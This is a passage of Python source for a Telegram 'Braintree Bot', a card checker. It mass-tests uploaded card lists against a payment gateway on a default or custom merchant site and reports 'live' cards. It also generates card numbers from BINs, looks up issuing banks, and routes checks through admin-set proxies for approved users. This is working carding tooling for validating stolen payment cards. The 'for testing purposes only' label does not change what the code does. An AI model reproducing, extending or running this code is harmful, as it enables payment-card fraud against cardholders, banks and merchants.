            progress_msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            progress_msg += f"<code>[{bar}]</code>\n"
            progress_msg += f"<b>{progress_percent}%</b> • <code>{idx}/{len(cards)}</code> cards\n\n"
            progress_msg += f"⏱️ <i>Checking card #{idx}...</i>\n"
            progress_msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            try:
                bot.edit_message_text(progress_msg, message.chat.id, status_msg.message_id, 
                                     parse_mode='HTML', reply_markup=stop_markup)
            except:
                pass
            
            time.sleep(1)
        
        was_stopped = stop_checking.get(message.chat.id, False)
        stop_checking[message.chat.id] = False
        
        file_response = "╔════════════════════════════╗\n"
        if was_stopped:
            file_response += "║   🛑 CHECK STOPPED BY USER   ║\n"
        else:
            file_response += "║   ✅ FILE CHECK COMPLETE   ║\n"
        file_response += "╚════════════════════════════╝\n\n"
        file_response += f"📊 <b>FINAL RESULTS</b>\n"
        file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        file_response += f"<b>📥 Total Cards:</b> <code>{len(results)}</code>\n"
        file_response += f"<b>✅ CCN Valid:</b> <code>{ccn_count}</code>\n"
        file_response += f"<b>⚠️ CVV Match:</b> <code>{cvv_count}</code>\n"
        file_response += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
        file_response += f"<b>❌ Declined:</b> <code>{declined_count}</code>\n\n"
        
        if cvv_count > 0 or ccn_count > 0 or low_funds_count > 0:
            file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            file_response += f"🎯 <b>LIVE CARDS FOUND</b>\n"
            file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            for card, result in results:
                if result['status'] in ['live', 'live_cvv', 'insufficient']:
                    status_emoji = '✅' if result['status'] == 'live' else ('⚠️' if result['status'] == 'live_cvv' else '💰')
                    file_response += f"{status_emoji} <code>{card}</code>\n"
                    file_response += f"└ <i>{result['message']}</i>\n\n"
        else:
            file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            file_response += f"❌ <b>NO LIVE CARDS FOUND</b>\n"
            file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        file_response += f"👤 <b>Checked by:</b> @{message.from_user.username or 'User'}\n"
        file_response += f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        
        bot.edit_message_text(file_response, message.chat.id, status_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")

# Rest of the commands (bin, gen, custom_site, proxy, etc.) - CONTINUING IN NEXT PART...

@bot.message_handler(commands=['bin'])
@require_approval
def check_bin(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage: /bin 464995"
        bot.send_message(message.chat.id, text)
        return
    bin_number = command_parts[1].strip()
    if not bin_number.isdigit() or len(bin_number) < 6:
        text = "╔════════════════════╗\n"
        text += "║   ❌ INVALID BIN   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "BIN must be at least 6 digits"
        bot.send_message(message.chat.id, text)
        return
    
    status_msg = bot.send_message(message.chat.id, "🔍 Looking up BIN...")
    card_info = get_card_info(bin_number.ljust(16, '0'))
    
    bin_response = "╔════════════════════════╗\n"
    bin_response += "║   🔍 BIN LOOKUP   ║\n"
    bin_response += "╚════════════════════════╝\n\n"
    bin_response += f"🔢 BIN: {bin_number}\n"
    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    bin_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
    bin_response += f"📊 Type: {card_info.get('type', 'Unknown')}\n"
    bin_response += f"⭐ Level: {card_info.get('level', 'Unknown')}\n"
    bin_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
    bin_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    bin_response += f"👤 By: @{message.from_user.username or 'User'}"
    
    bot.edit_message_text(bin_response, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
    command_parts = message.text.split()
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/gen 453212 10 - Random date\n"
        text += "/gen 453212|06|30 10 - Specific date\n\n"
        text += "Max: 20 cards per request"
        bot.send_message(message.chat.id, text)
        return
    
    bin_input = command_parts[1].strip()
    exp_month = None
    exp_year = None
    
    if '|' in bin_input:
        parts = bin_input.split('|')
        bin_input = parts[0]
        if len(parts) >= 3:
            try:
                exp_month = parts[1].strip()
                exp_year = parts[2].strip()
            except:
                pass
    
    bin_input = bin_input.replace('x', '').replace('X', '')
    bin_number = ''.join(c for c in bin_input if c.isdigit())
    
    quantity = 10
    if len(command_parts) > 2:
        try:
            quantity = int(command_parts[2])
        except:
            quantity = 10
    
    if not bin_number or len(bin_number) < 6:
        text = "╔════════════════════╗\n"
        text += "║   ❌ INVALID BIN   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "BIN must be at least 6 digits"
        bot.send_message(message.chat.id, text)
        return
    
    bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
    
    status_msg = bot.send_message(message.chat.id, f"🎲 Generating {quantity} cards...")
    
    cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
    if error:
        bot.edit_message_text(f"❌ Error: {error}", message.chat.id, status_msg.message_id)
        return
    
    user_sessions[message.chat.id] = {'generated_cards': cards}
    
    card_info = get_card_info(bin_number.ljust(16, '0'))
    date_info = "Random dates" if not exp_month else f"{exp_month}/{exp_year}"
    
    gen_response = "╔════════════════════════╗\n"
    gen_response += "║  🎲 GENERATED CARDS  ║\n"
    gen_response += "╚════════════════════════╝\n\n"
    gen_response += f"🔢 BIN: {bin_number}\n"
    gen_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
    gen_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
    gen_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
    gen_response += f"📅 Expiry: {date_info}\n"
    gen_response += f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    gen_response += f"✨ Generated {len(cards)} Cards\n"
    gen_response += f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for card in cards:
        gen_response += f"💳 {card}\n"
    
    gen_response += "\n⚠️ For testing purposes only\n"
    gen_response += "💡 Tip: Use /bchk or /bmass to check!"
    
    bot.edit_message_text(gen_response, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['custom_site'])
@require_approval
def custom_site_command(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  🌍 CUSTOM SITE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/custom_site https://bandc.com\n\n"
        text += "💡 Set your own site for checking\n"
        text += "🔒 Only you will use this site"
        bot.send_message(message.chat.id, text)
        return
    
    site_url = command_parts[1].strip()
    
    if not site_url.startswith('http://') and not site_url.startswith('https://'):
        bot.send_message(message.chat.id, "❌ URL must start with http:// or https://")
        return
    
    user_custom_sites[message.chat.id] = site_url
    
    text = "╔════════════════════╗\n"
    text += "║  ✅ SITE SET  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"🌍 Your custom site:\n"
    text += f"{site_url}\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "✅ All your checks will use this site\n"
    text += "💡 Use /remove_site to reset"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['remove_site'])
@require_approval
def remove_site_command(message):
    if message.chat.id in user_custom_sites:
        del user_custom_sites[message.chat.id]
        text = "╔════════════════════╗\n"
        text += "║  🗑️ SITE REMOVED  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "✅ Custom site removed\n"
        text += "🔄 Using default site now"
    else:
        text = "╔════════════════════╗\n"
        text += "║  ℹ️ NO CUSTOM SITE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "📌 You're using the default site\n"
        text += "💡 Use /custom_site to set one"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['site'])
@require_approval
def check_current_site(message):
    current_site = get_braintree_site(message.chat.id)
    is_custom = message.chat.id in user_custom_sites
    
    text = "╔════════════════════════╗\n"
    text += "║  🌍 CURRENT SITE  ║\n"
    text += "╚════════════════════════╝\n\n"
    text += f"{'🔧 Custom' if is_custom else '📌 Default'} Site:\n"
    text += f"{current_site}\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    if is_custom:
        text += "💡 Use /remove_site to reset"
    else:
        text += "💡 Use /custom_site to set your own"
    
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['proxy'])
def set_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║   🌐 SET PROXY   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/proxy http://user:pass@host:port\n"
        text += "or\n"
        text += "/proxy host:port@user:pass"
        bot.send_message(message.chat.id, text)
        return
    
    proxy_input = command_parts[1].strip()
    
    if '@' in proxy_input and not proxy_input.startswith('http'):
        try:
            parts = proxy_input.split('@')
            if len(parts) == 2:
                host_port = parts[0]
                user_pass = parts[1]
                proxy_url = f"http://{user_pass}@{host_port}"
            else:
                proxy_url = proxy_input
        except:
            proxy_url = proxy_input
    else:
        proxy_url = proxy_input
    
    status_msg = bot.send_message(message.chat.id, "⏳ Testing proxy...")
    
    success, msg = set_proxy(proxy_url)
    
    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except:
        pass
    
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    result_text = "╔════════════════════╗\n"
    result_text += f"║  {'✅ PROXY LIVE' if success else '❌ PROXY DEAD'}  ║\n"
    result_text += "╚════════════════════╝\n\n"
    result_text += f"{'🟢' if success else '🔴'} {msg}"
    
    result_msg = bot.send_message(message.chat.id, result_text)
    
    time.sleep(3)
    try:
        bot.delete_message(message.chat.id, result_msg.message_id)
    except:
        pass

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    msg = remove_proxy()
    text = "╔════════════════════╗\n"
    text += "║  🚫 PROXY REMOVED  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"✅ {msg}"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['proxystatus'])
def proxy_status_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    with PROXY_LOCK:
        text = "╔════════════════════╗\n"
        text += "║  📊 PROXY STATUS  ║\n"
        text += "╚════════════════════╝\n\n"
        if ACTIVE_PROXY:
            text += f"🟢 Status: Active\n"
            text += f"🌐 Proxy: {ACTIVE_PROXY}"
        else:
            text += "🔴 Status: Not set\n"
            text += "🌍 Using direct connection"
        bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    if not approved_users:
        bot.send_message(message.chat.id, "📭 No approved users yet")
        return
    text = "╔════════════════════╗\n"
    text += "║  👥 APPROVED USERS  ║\n"
    text += "╚════════════════════╝\n\n"
    for idx, uid in enumerate(approved_users, 1):
        text += f"{idx}. 🆔 {uid}\n"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['pending'])
def list_pending_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    if not pending_requests:
        bot.send_message(message.chat.id, "📭 No pending requests")
        return
    text = "╔══════════════════════╗\n"
    text += "║  ⏳ PENDING REQUESTS  ║\n"
    text += "╚══════════════════════╝\n\n"
    for user_id, info in pending_requests.items():
        text += f"👤 {info['name']}\n"
        text += f"🔗 @{info['username']}\n"
        text += f"🆔 {user_id}\n"
        text += f"📅 {info['date']}\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  📢 BROADCAST  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/broadcast Your message here\n\n"
        text += "This will send the message to all approved users."
        bot.send_message(message.chat.id, text)
        return
    
    broadcast_text = command_parts[1].strip()
    
    if not approved_users:
        bot.send_message(message.chat.id, "❌ No approved users to broadcast to")
        return
    
    status_msg = bot.send_message(message.chat.id, "📤 Starting broadcast...")
    
    success_count = 0
    failed_count = 0
    total_users = len(approved_users)
    
    broadcast_message = "╔════════════════════════╗\n"
    broadcast_message += "║  📢 ADMIN BROADCAST  ║\n"
    broadcast_message += "╚════════════════════════╝\n\n"
    broadcast_message += f"{broadcast_text}\n\n"
    broadcast_message += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    broadcast_message += "📣 Message from Admin"
    
    for idx, user_id in enumerate(approved_users, 1):
        try:
            bot.send_message(user_id, broadcast_message)
            success_count += 1
        except Exception as e:
            failed_count += 1
            print(f"Failed to send to {user_id}: {e}")
        
        try:
            progress_text = f"📤 Broadcasting...\n\n"
            progress_text += f"✅ Sent: {success_count}\n"
            progress_text += f"❌ Failed: {failed_count}\n"
            progress_text += f"📊 Progress: {idx}/{total_users}"
            bot.edit_message_text(progress_text, message.chat.id, status_msg.message_id)
        except:
            pass
        
        time.sleep(0.5)
    
    final_text = "╔════════════════════════╗\n"
    final_text += "║  ✅ BROADCAST COMPLETE  ║\n"
    final_text += "╚════════════════════════╝\n\n"
    final_text += f"📊 <b>RESULTS</b>\n"
    final_text += f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    final_text += f"<b>✅ Successful:</b> <code>{success_count}</code>\n"
    final_text += f"<b>❌ Failed:</b> <code>{failed_count}</code>\n"
    final_text += f"<b>📥 Total Users:</b> <code>{total_users}</code>\n\n"
    final_text += f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
    final_text += f"🕐 Time: {datetime.now().strftime('%H:%M:%S')}"
    
    bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['help'])
@require_approval
def send_help(message):
    help_text = "╔════════════════════╗\n"
    help_text += "║   📚 HOW TO USE   ║\n"
    help_text += "╚════════════════════╝\n\n"
    help_text += "💳 SINGLE CHECK\n"
    help_text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "/bchk 4532123456789012|12|25|123\n\n"
    help_text += "🔍 BIN LOOKUP\n"
    help_text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "/bin 453212\n\n"
    help_text += "🎲 GENERATE CARDS\n"
    help_text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "/gen 453212 5\n"
    help_text += "/gen 453212|06|30 5\n\n"
    help_text += "📦 MASS CHECK\n"
    help_text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "/bmass card1|mm|yy|cvv\n"
    help_text += "card2|mm|yy|cvv\n\n"
    help_text += "📁 FILE UPLOAD\n"
    help_text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "1. Use /bfile\n"
    help_text += "2. Upload .txt file\n\n"
    help_text += "📝 Format: card|mm|yy|cvv\n\n"
    help_text += "✨ Braintree Gateway! ✨"
    bot.send_message(message.chat.id, help_text)

if __name__ == '__main__':
    print("🚀 Braintree Bot started...")
    print("✅ Using bandc.com as default site")
    print("💳 Commands: /bchk, /bmass, /bfile")
    bot.infinity_polling()